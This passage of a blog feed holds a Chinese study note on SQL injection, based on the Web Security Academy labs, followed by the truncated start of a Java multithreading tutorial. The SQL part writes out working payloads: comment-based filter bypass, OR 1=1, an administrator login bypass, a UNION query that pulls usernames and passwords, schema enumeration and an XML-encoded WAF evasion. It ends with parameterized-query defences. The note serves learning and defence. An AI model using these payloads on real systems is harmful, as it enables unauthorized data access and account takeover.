    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p>在burpsuite中有一个<code>Web Security Academy</code>，其中可以学习常见漏洞，现在开始学习其中的内容。</p><p>这一章会介绍什么是SQL注入，其中有一些例子来解释怎么检查和利用不同种类的SQL注入漏洞，最后总结如何预防SQL注入。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/sql-injection.svg" alt="SQL injection"></p><h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><p>SQL注入（SQLi）是一个web安全漏洞，允许攻击者干扰应用程序对其数据库的查询。它通常允许攻击者查看通常无法检索的数据。这可能包括属于其他用户的数据，或应用程序本身能够访问的任何其他数据。在许多情况下，攻击者可以修改或删除此数据，从而对应用程序的内容或行为造成永久性更改。</p><p>在某些情况下，攻击者可以升级SQL注入攻击以破坏底层服务器或其他后端基础设施，或执行拒绝服务攻击。</p><h2 id="SQL注入的危害"><a href="#SQL注入的危害" class="headerlink" title="SQL注入的危害"></a>SQL注入的危害</h2><p>成功的SQL注入攻击可能导致未经授权访问敏感数据，如密码、信用卡详细信息或个人用户信息。近年来，许多引人注目的数据泄露都是SQL注入攻击的结果，导致声誉受损和监管罚款。在某些情况下，攻击者可以获得进入组织系统的持久后门，从而导致长期威胁，并可能在很长一段时间内被忽视。</p><h2 id="查看隐藏数据"><a href="#查看隐藏数据" class="headerlink" title="查看隐藏数据"></a>查看隐藏数据</h2><p>考虑一个显示不同类别产品的购物应用程序。当用户单击<code>Gifts</code>类别时，他们的浏览器会请求URL：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>nsecure-website.com/products?category=Gifts<br></code></pre></td></tr></table></figure><p>这会导致应用程序进行SQL查询，以从数据库中检索相关产品的详细信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> category <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Gifts&#x27;</span> <span class="hljs-keyword">AND</span> released <span class="hljs-operator">=</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>这里的限制条件<code>released=1</code>被用来隐藏未发布的产品，如果要查看未发布的产品，大概<code>released=0</code>。</p><p>该应用程序没有实现任何针对SQL注入攻击的防御，因此攻击者可以构造如下攻击：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//i</span>nsecure-website.com/products?category=Gifts<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure><p>这样的SQL查询语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> category <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Gifts&#x27;</span><span class="hljs-comment">--&#x27; AND released = 1</span><br></code></pre></td></tr></table></figure><p>在SQL中<code>--</code>为注释符号，这意味着后面的语句会被注释。在这里后面的<code>AND released=1</code>会被注释，所以所有的产品都会显示，包括未发布的产品。</p><p>更进一步，攻击者可以使应用程序显示任何类别的所有产品，包括他们不知道的类别：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://insecure-website.com/products?category=Gifts&#x27;+OR+<span class="hljs-number">1</span>=<span class="hljs-number">1</span>--<br></code></pre></td></tr></table></figure><p>这样的SQL查询语句为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> category <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Gifts&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--&#x27; AND released = 1</span><br></code></pre></td></tr></table></figure><p>修改后的查询语句查询的类别为<code>Gifts</code>或者<code>1=1</code>，而<code>1=1</code>返回为True，所以会显示所有种类的产品。</p><blockquote><p>对应LAB：<code>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</code></p></blockquote><h2 id="绕过应用逻辑"><a href="#绕过应用逻辑" class="headerlink" title="绕过应用逻辑"></a>绕过应用逻辑</h2><p>有的应用可以通过用户名和密码登录，如果用户提交用户名为<code>wiener</code>以及密码为<code>bluecheese</code>，那么应用会以下面的语句进行查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;wiener&#x27;</span> <span class="hljs-keyword">AND</span> password <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;bluecheese&#x27;</span><br></code></pre></td></tr></table></figure><p>如果查询语句返回了用户的信息，说明登录成功；否则就被拒绝登录。</p><p>现在攻击者可以登录任何用户而不用进行密码验证，只需要使用<code>--</code>来绕过<code>WHERE</code>条件中对<code>password</code>的检查。比如，提交的用户名为<code>administrator&#39;--</code>，而不用输入密码，那么会进行这样的SQL查询：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username = <span class="hljs-string">&#x27;administrator&#x27;</span>--<span class="hljs-string">&#x27; AND password = &#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>这条语句使得攻击者成功的以<code>administrator</code>的身份登录。</p><blockquote><p>对应LAB：<code>SQL injection vulnerability allowing login bypass</code></p></blockquote><h2 id="查询其他表的数据"><a href="#查询其他表的数据" class="headerlink" title="查询其他表的数据"></a>查询其他表的数据</h2><p>在应用程序响应中返回SQL查询结果的情况下，攻击者可以利用SQL注入漏洞从数据库中的其他表中检索数据。这种操作使用的是<code>UNION</code>关键字，这个关键字会执行另外的<code>SELECT</code>查询，然后添加到原来的查询结果中。</p><p>比如有这样的查询语句包含了用户输入<code>Gifts</code>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> name, description <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> category <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;Gifts&#x27;</span><br></code></pre></td></tr></table></figure><p>攻击者可以提交这样的输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; UNION SELECT username, password FROM users--</span><br></code></pre></td></tr></table></figure><p>这会使得应用返回所有<code>username</code>和<code>password</code>以及产品的名字和描述。</p><h2 id="检查数据库"><a href="#检查数据库" class="headerlink" title="检查数据库"></a>检查数据库</h2><p>在初始识别SQL注入漏洞之后，通常可以获得有关数据库本身的一些信息。利用这些信息可以进行更深入的攻击。</p><p>比如可以查询数据库的版本详细信息。这样做的方式取决于数据库类型，因此可以从任何有效的技术推断数据库类型。例如，在Oracle上，可以执行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> v$version<br></code></pre></td></tr></table></figure><p>还可以确定存在哪些数据库表以及它们包含哪些列。例如，在大多数数据库上，可以执行以下查询以列出表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> information_schema.tables<br></code></pre></td></tr></table></figure><h2 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h2><p>许多SQL注入实例都是盲漏洞。这意味着应用程序不会返回SQL查询的结果或其响应中任何数据库错误的详细信息。仍然可以利用盲漏洞访问未经授权的数据，但所涉及的技术通常更复杂且难以执行。</p><p>根据漏洞的性质和所涉及的数据库，可以使用以下技术来利用盲SQL注入漏洞：</p><ul><li>可以更改查询的逻辑，以根据单个条件的真实性触发应用程序响应中的可检测差异。这可能涉及将一个新条件注入一些布尔逻辑，或者有条件地触发一个错误，例如<code>divide-by-zero</code>。</li><li>可以有条件地触发查询处理中的时间延迟，允许根据应用程序响应所需的时间推断条件的真实性。</li><li>可以使用<a href="https://portswigger.net/burp/application-security-testing/oast">OAST</a>技术触发带外网络交互。这种技术非常强大，适用于其他技术不具备的情况。通常，可以通过带外通道直接过滤数据，例如，通过将数据放入控制的域的DNS查找中。</li></ul><h2 id="怎么检测SQL注入"><a href="#怎么检测SQL注入" class="headerlink" title="怎么检测SQL注入"></a>怎么检测SQL注入</h2><p>通过<code>BurpSuite</code>的<code>web vulnerability scanner</code>功能可以快速的发现大部分SQL注入漏洞。:thinking:</p><p>通过对应用程序中的每个入口点使用一组系统测试，可以手动检测SQL注入。这通常包括：</p><ul><li>在参数后面添加<code>&#39;</code>后体检，查看错误或异常信息。</li><li>提交一些特定于SQL的语法，该语法的计算结果为入口点的基本（原始）值和不同的值，并在生成的应用程序响应中查找系统差异。</li><li>提交布尔条件，比如<code>OR 1=1</code>以及<code>OR 1=2</code>，查看响应的不同。</li><li>提交设计用于在SQL查询中执行时触发时间延迟的有效负载，并查找响应所需时间的差异。</li><li>提交OAST有效负载，用于在SQL查询中执行时触发带外网络交互，并监控任何结果交互。</li></ul><h2 id="不同查询语句的SQL注入"><a href="#不同查询语句的SQL注入" class="headerlink" title="不同查询语句的SQL注入"></a>不同查询语句的SQL注入</h2><p>大多数SQL注入漏洞都出现在<code>SELECT</code>查询的<code>WHERE</code>子句中。经验丰富的测试人员通常很好地理解这种类型的SQL注入。</p><p>但是SQL注入漏洞原则上可以发生在查询中的任何位置，以及不同的查询类型中。SQL注入最常见的其他位置是：</p><ul><li>在<code>UPDATE</code>语句的更新值或者<code>WHERE</code>条件中；</li><li>在<code>INSERT</code>语句的插入值中；</li><li>在<code>SELECT</code>语句的表名或列名中；</li><li>在<code>SELECT</code>语句的<code>ORDER BY</code>语句中；</li></ul><h2 id="不同语境中的SQL注入"><a href="#不同语境中的SQL注入" class="headerlink" title="不同语境中的SQL注入"></a>不同语境中的SQL注入</h2><p>之前介绍的注入中使用了查询字符串来注入恶意SQL负载。但是，需要注意的是，可以使用应用程序作为SQL查询处理的任何可控输入来执行SQL注入攻击。例如，一些网站接受JSON或XML格式的输入，并使用它来查询数据库。</p><p>这些不同的格式甚至可以为提供其他方法来混淆（<a href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding">onfuscate attacks</a>）由于WAF和其他防御机制而被阻止的攻击。弱实现（Weak implementations）通常只在请求中查找常见的SQL注入关键字，因此您可以通过简单地对禁止的关键字中的字符进行编码或转义来绕过这些过滤器。例如，以下基于XML的SQL注入使用XML转义序列对<code>SELECT</code>中的<code>S</code>字符进行编码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">stockCheck</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">productId</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">productId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">storeId</span>&gt;</span><br>        999 <span class="hljs-symbol">&amp;#x53;</span>ELECT * FROM information_schema.tables<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">storeId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">stockCheck</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这将在传递给SQL解释器之前在服务器端进行解码。</p><blockquote><p>对应LAB：<code>SQL injection with filter bypass via XML encoding</code></p><p>这个需要重点看一些。</p></blockquote><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>当应用程序从HTTP请求中获取用户输入，并且在处理该请求的过程中，以不安全的方式将输入合并到SQL查询中时，就会出现一阶SQL注入（First-order SQL injection）。</p><p>在二阶SQL注入（也称为存储SQL注入）中，应用程序从HTTP请求中获取用户输入，并将其存储以供将来使用。这通常是通过将输入放入数据库来完成的，但在数据存储点不会出现漏洞。稍后，当处理不同的HTTP请求时，应用程序会检索存储的数据，并以不安全的方式将其合并到SQL查询中。</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/second-order-sql-injection.svg" alt="Second-order SQL injection"></p><p>二阶SQL注入通常出现在开发人员意识到SQL注入漏洞的情况下，因此可以安全地处理输入到数据库中的初始位置。当数据稍后被处理时，它被认为是安全的，因为它以前被安全地放置在数据库中。此时，数据以不安全的方式处理，因为开发人员错误地认为它是可信的。</p><h2 id="数据库特定因素"><a href="#数据库特定因素" class="headerlink" title="数据库特定因素"></a>数据库特定因素</h2><p>SQL语言的一些核心功能在流行的数据库平台上以相同的方式实现，因此许多检测和利用SQL注入漏洞的方法在不同类型的数据库上同样有效。</p><p>然而，常见数据库之间也存在许多差异。这意味着一些检测和利用SQL注入的技术在不同平台上的工作方式不同。例如：</p><ul><li>字符串连接语法（Syntax for string concatenation）</li><li>注释（Comments）</li><li>堆叠查询（Batched (or stacked) queries）</li><li>特定平台的API（Platform-specific APIs）</li><li>错误信息（Error messages）</li></ul><h2 id="怎么防御SQL注入"><a href="#怎么防御SQL注入" class="headerlink" title="怎么防御SQL注入"></a>怎么防御SQL注入</h2><p>大多数SQL注入实例可以通过使用参数化查询（也称为预编译）而不是查询中的字符串连接来防止。</p><p>以下代码容易受到SQL注入的攻击，因为用户输入直接连接到查询中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM products WHERE category = &#x27;&quot;</span>+ input + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-type">Statement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.createStatement();<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery(query);<br></code></pre></td></tr></table></figure><p>此代码可以以防止用户输入干扰查询结构的方式轻松重写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">statement</span> <span class="hljs-operator">=</span> connection.prepareStatement(<span class="hljs-string">&quot;SELECT * FROM products WHERE category = ?&quot;</span>);<br>statement.setString(<span class="hljs-number">1</span>, input);<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">resultSet</span> <span class="hljs-operator">=</span> statement.executeQuery();<br></code></pre></td></tr></table></figure><p>参数化查询可以用于任何不受信任的输入在查询中显示为数据的情况，包括<code>WHERE</code>子句和<code>INSERT</code>或<code>UPDATE</code>语句中的值。它们不能用于处理查询的其他部分中不受信任的输入，例如表或列名，或<code>ORDER BY</code>子句。将不受信任的数据放入查询的那些部分的应用程序功能需要采取不同的方法，例如白名单允许的输入值，或者使用不同的逻辑来提供所需的行为。</p><p>要使参数化查询有效地防止SQL注入，查询中使用的字符串必须始终是硬编码常量，并且决不能包含任何来源的变量数据。不要试图逐个决定一个数据项是否可信，并继续在查询中使用字符串连接来确定被认为安全的情况。很容易在数据的可能来源上出错，或者在其他代码中的更改违反了关于数据被污染的假设。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>sql注入</category>
      
      <category>burpsuite</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>sql注入</tag>
      
      <tag>burpsuite</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[java] java多线程</title>
    <link href="/2022/10/21/%5Bjava%5D%20java%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    <url>/2022/10/21/%5Bjava%5D%20java%E5%A4%9A%E7%BA%BF%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="java多线程"><a href="#java多线程" class="headerlink" title="java多线程"></a>java多线程</h1><blockquote><p><a href="https://blog.csdn.net/evankaka/article/details/44153709">Java多线程学习（吐血超详细总结）_Evankaka的博客-CSDN博客_java 多线程</a></p><p><a href="https://blog.csdn.net/ThinkWon/article/details/102021274">进程和线程的区别(超详细)_ThinkWon的博客-CSDN博客_进程和线程</a></p><p><a href="https://blog.csdn.net/qq_44715943/article/details/116714584">Java多线程（超详细！）_一个快乐的野指针~的博客-CSDN博客_java多线程</a></p></blockquote><h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><p>进程是并发执行的程序在执行过程中分配和管理资源的基本单位，是一个动态概念，竞争计算机系统资源的基本单位。进程是资源分配的最小单位。每个进程都有独立的代码和数据空间，进程间的切换有较大的开销。</p><p>线程是进程的执行单位，负责当前进程中程序的执行，一个进程有一个或多个线程，多个线程可以共享代码和数据空间，每个线程有独立的运行栈和程序计数器，线程切换开销小。线程是CPU调度的最小单位。</p><p>java程序天生就是多线程程序，查看普通的java程序有哪些线程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 获取 Java 线程管理 MXBean</span><br>        <span class="hljs-type">ThreadMXBean</span> <span class="hljs-variable">threadMXBean</span> <span class="hljs-operator">=</span> ManagementFactory.getThreadMXBean();<br>        <span class="hljs-comment">// 不需要获取同步的 monitor 和 synchronizer 信息，仅获取线程和线程堆栈信息</span><br>        ThreadInfo[] threadInfos = threadMXBean.dumpAllThreads(<span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>        <span class="hljs-comment">// 遍历线程信息，仅打印线程 ID 和线程名称信息</span><br>        <span class="hljs-keyword">for</span> (ThreadInfo threadInfo : threadInfos) &#123;<br>            System.out.println(<span class="hljs-string">&quot;[&quot;</span> + threadInfo.getThreadId() + <span class="hljs-string">&quot;] &quot;</span> + threadInfo.getThreadName());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>程序输出为：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-attr">[6]</span> <span class="hljs-selector-tag">Monitor</span> <span class="hljs-selector-tag">Ctrl-Break</span>    <span class="hljs-comment">// 监听线程转储或“线程堆栈跟踪”的线程</span><br><span class="hljs-selector-attr">[5]</span> <span class="hljs-selector-tag">Attach</span> <span class="hljs-selector-tag">Listener</span>    <span class="hljs-comment">// 负责接收到外部的命令，而对该命令进行执行的并且把结果返回给发送者</span><br><span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">Signal</span> <span class="hljs-selector-tag">Dispatcher</span>    <span class="hljs-comment">// 分发处理给 JVM 信号的线程</span><br><span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">Finalizer</span>    <span class="hljs-comment">// 在垃圾收集前，调用对象 finalize 方法的线程</span><br><span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">Reference</span> <span class="hljs-selector-tag">Handler</span>    <span class="hljs-comment">// 用于处理引用对象本身（软引用、弱引用、虚引用）的垃圾回收的线程</span><br><span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">main</span>    <span class="hljs-comment">// main 线程,程序入口</span><br></code></pre></td></tr></table></figure><h2 id="进程和线程的区别"><a href="#进程和线程的区别" class="headerlink" title="进程和线程的区别"></a>进程和线程的区别</h2><p>线程又被成为轻量级进程。</p><ol><li>根本区别：进程是操作系统资源分配的基本单位，而线程是处理器任务调度和执行的基本单位</li><li>资源开销：每个进程都有独立的代码和数据空间（程序上下文），程序之间的切换会有较大的开销；线程可以看做轻量级的进程，同一类线程共享代码和数据空间，每个线程都有自己独立的运行栈和程序计数器（PC），线程之间切换的开销小。</li><li>包含关系：如果一个进程内有多个线程，则执行过程不是一条线的，而是多条线（线程）共同完成的；线程是进程的一部分，所以线程也被称为轻权进程或者轻量级进程。</li><li>内存分配：同一进程的线程共享本进程的地址空间和资源，而进程之间的地址空间和资源是相互独立的。</li><li>影响关系：个进程崩溃后，在保护模式下不会对其他进程产生影响，但是一个线程崩溃整个进程都死掉。所以多进程要比多线程健壮。</li><li>执行过程：每个独立的进程有程序运行的入口、顺序执行序列和程序出口。但是线程不能独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制，两者均可并发执行。</li></ol><h2 id="java中的多线程"><a href="#java中的多线程" class="headerlink" title="java中的多线程"></a>java中的多线程</h2><p>线程和进程一样分为五个阶段：创建、就绪、运行、阻塞、终止。</p><p>java中实现多线程有三种方法：</p><ol><li>继承<code>Thread</code>类</li><li>实现<code>Runable</code>接口</li><li>实现<code>Callable</code>接口</li></ol><h3 id="继承java-lang-Thread"><a href="#继承java-lang-Thread" class="headerlink" title="继承java.lang.Thread"></a>继承<code>java.lang.Thread</code></h3><p>创建新的类，继承<code>java.lang.Thread</code>，重写<code>run</code>方法。</p><p>这里新建类<code>Thread1</code>，功能就是每隔1秒输出1个值，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread1</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Thread1</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Thread1</span><span class="hljs-params">(String name)</span>&#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>            System.out.println(<span class="hljs-string">&quot;任务: &quot;</span> + name + <span class="hljs-string">&quot; 值 &quot;</span> + i);<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">1000</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在主程序中新建并启动线程，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyThread</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Thread1</span> <span class="hljs-variable">thread11</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread1</span>(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-type">Thread1</span> <span class="hljs-variable">thread12</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread1</span>(<span class="hljs-string">&quot;B&quot;</span>);<br>        <span class="hljs-type">Thread1</span> <span class="hljs-variable">thread13</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread1</span>(<span class="hljs-string">&quot;C&quot;</span>);<br>        thread11.start();<br>        thread12.start();<br>        thread13.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后输出为：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">任务: A 值 0</span><br><span class="hljs-section">任务: B 值 0</span><br><span class="hljs-section">任务: C 值 0</span><br><span class="hljs-section">任务: C 值 1</span><br><span class="hljs-section">任务: B 值 1</span><br><span class="hljs-section">任务: A 值 1</span><br><span class="hljs-section">任务: B 值 2</span><br><span class="hljs-section">任务: A 值 2</span><br><span class="hljs-section">任务: C 值 2</span><br><span class="hljs-section">任务: B 值 3</span><br><span class="hljs-section">任务: C 值 3</span><br><span class="hljs-section">任务: A 值 3</span><br><span class="hljs-section">任务: C 值 4</span><br><span class="hljs-section">任务: A 值 4</span><br><span class="hljs-section">任务: B 值 4</span><br></code></pre></td></tr></table></figure><p>可以看到结果的输出中，三个任务的顺序的不确定的。</p><p>在程序运行main时候，java虚拟机启动一个进程，主线程main在main()调用时候被创建。在主线程中创建了三个线程，这样，整个应用就在多线程下运行。</p><p><code>start()</code>方法的调用后并不是立即执行多线程代码，而是使得该线程变为可运行态（Runnable），什么时候运行是由操作系统决定的。start方法只能调用一次。</p><blockquote><p><a href="https://www.jianshu.com/p/f62a9e8da489">Java中一个线程可以多次start吗? </a></p><p><strong>不可以</strong></p><p>通过Thread实例的start()，一个Thread的实例只能产生一个线程。一个Thread的实例一旦调用start()方法，这个实例的started标记就标记为true，事实中不管这个线程后来有没有执行到底，只要调用了一次start()就再也没有机会运行了。</p><p>一个线程对象只能调用一次start方法.从new到等待运行是单行道,所以如果你对一个已经启动的线程对象再调用一次start方法的话,会产生:<code>IllegalThreadStateException</code>异常. 可以被重复调用的是run()方法。</p><p>Thread类中run()和start()方法的区别如下:</p><ul><li>run()方法: 在<strong>本线程</strong>内调用该Runnable对象的run()方法，可以重复多次调用；</li><li>start()方法: <strong>启动一个线程</strong>，调用该Runnable对象的run()方法，不能多次启动一个线程</li></ul></blockquote><h3 id="实现java-lang-Runnable接口"><a href="#实现java-lang-Runnable接口" class="headerlink" title="实现java.lang.Runnable接口"></a>实现<code>java.lang.Runnable</code>接口</h3><p>创建新的类，实现<code>java.lang.Runnable</code>接口，实现<code>run</code>方法。</p><p>创建新类，实现<code>java.lang.Runnable</code>接口，作用是每秒输出值，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Thread2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br><br>    <span 